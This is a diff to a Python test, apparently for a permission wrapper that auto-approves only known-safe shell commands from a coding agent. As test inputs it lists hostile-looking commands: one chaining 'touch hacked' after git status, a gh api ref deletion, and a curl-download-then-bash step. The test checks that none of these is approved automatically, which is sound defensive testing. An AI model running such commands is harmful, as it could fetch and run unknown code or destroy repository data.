@@ -305,7 +305,8 @@ def the_output_wrapper_approves_only_what_it_knows(r):
     for cmd in ("git status; touch hacked", "gh api -X DELETE repos/o/r/git/refs/heads/x; git status",
                 "pytest -q > report.txt", "curl -s https://x -o i.sh && bash i.sh && make"):
         expect(wrap(cmd) == "", "left to the harness's approval: %r -> %s" % (cmd, wrap(cmd)))
-    expect('"permissionDecision":"allow"' in wrap("cd app && pytest -q 2>&1"), "a plain test run is still capped")
+    # No cd: on Windows a cd is never wrapped (PowerShell and bash would read it differently).
+    expect('"permissionDecision":"allow"' in wrap("pytest -q 2>&1"), "a plain test run is still capped")
     return {"wrap": True}
 
 
